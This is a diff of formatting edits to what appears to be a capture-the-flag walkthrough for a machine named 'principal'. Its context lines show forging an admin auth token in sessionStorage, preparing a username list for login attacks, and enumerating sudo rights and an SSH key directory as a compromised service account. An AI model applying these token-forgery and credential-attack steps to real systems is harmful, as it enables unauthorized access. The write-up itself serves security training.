@@ -157,7 +157,9 @@ sessionStorage.setItem('auth_token', 'FORGED_TOKEN_HERE');
 
 - **Result:** Dashboard access as admin!
 
+
 ![[Pasted image 20260805225557.png]]
+
 
 
 ---
@@ -195,7 +197,7 @@ The notes also mention:
 
 ### Prepare User List
 
-```text
+```bash
 cat > users.txt << EOF
 admin
 svc-deploy
@@ -261,11 +263,13 @@ svc-deploy@principal:~$ id
 uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
 ```
 
+
 ```bash
 svc-deploy@principal:~$ sudo -l
 [sudo] password for svc-deploy: 
 Sorry, user svc-deploy may not run sudo on principal.
 ```
+
 
 ```bash
 svc-deploy@principal:~$ ls -la /opt/principal/ssh/
